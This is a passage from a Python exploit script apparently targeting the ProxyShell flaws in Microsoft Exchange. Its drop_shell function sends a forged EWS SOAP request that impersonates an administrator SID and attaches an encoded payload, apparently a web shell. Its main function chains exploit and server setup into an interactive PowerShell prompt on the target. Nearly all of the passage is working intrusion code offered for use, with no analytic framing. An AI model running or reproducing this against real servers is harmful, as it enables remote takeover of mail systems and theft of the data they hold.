    parser.add_argument('-p', help='Local wsman port', default=8000, type=int)
    parser.add_argument('-c', help='PowerShell cmd to run', required=False)
    return parser.parse_args()


def drop_shell(proxyshell):

    data = f"""
    <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="{proxyshell.version}" />
    <t:SerializedSecurityContext>
      <t:UserSid>{proxyshell.sid}</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier Attributes=500>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:Items>
        <t:Message>
          <t:Subject>{proxyshell.rand_subj}</t:Subject>
          <t:Body BodyType="HTML">Hello</t:Body>
          <t:Attachments>
            <t:FileAttachment>
              <t:Name>FileAttachment.txt</t:Name>
              <t:IsInline>false</t:IsInline>
              <t:IsContactPhoto>false</t:IsContactPhoto>
              <t:Content>ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoLZnl33BlQUt9MGObmp39opINOpDYzJ6Z45OTk52qWpzYy+2lz32tYUfoLaddpUKVTTDdqCD2uC9wbWqV3agskxvtrWadMG1trzRAYNMZ45OTk5IZ6V+9ZUhrdpFNk=</t:Content>
            </t:FileAttachment>
          </t:Attachments>
          <t:ToRecipients>
            <t:Mailbox>
              <t:EmailAddress>{proxyshell.email}</t:EmailAddress>
            </t:Mailbox>
          </t:ToRecipients>
        </t:Message>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>
    """

    headers = {
        'Content-Type': 'text/xml'
    }
    
    r = proxyshell.post(
        f'/EWS/exchange.asmx/?X-Rps-CAT={proxyshell.token}',
        data=data,
        headers=headers
    )
   
    return r


def main():

    args = get_args()
    exchange_url = args.u
    email = args.e
    local_port = args.p

    proxyshell = ProxyShell(
        exchange_url,
        email
    )

    exploit(proxyshell)
    start_server(proxyshell, local_port)

    if args.c:
        shell(args.c, local_port, proxyshell)
    else:
        while True:
            shell(input('PS> '), local_port, proxyshell)


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
    if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
        print("This script requires Python 3.8 or higher!")
        print("You are using Python {}.{}.".format(sys.version_info.major, sys.version_info.minor))
        sys.exit(1)
    main()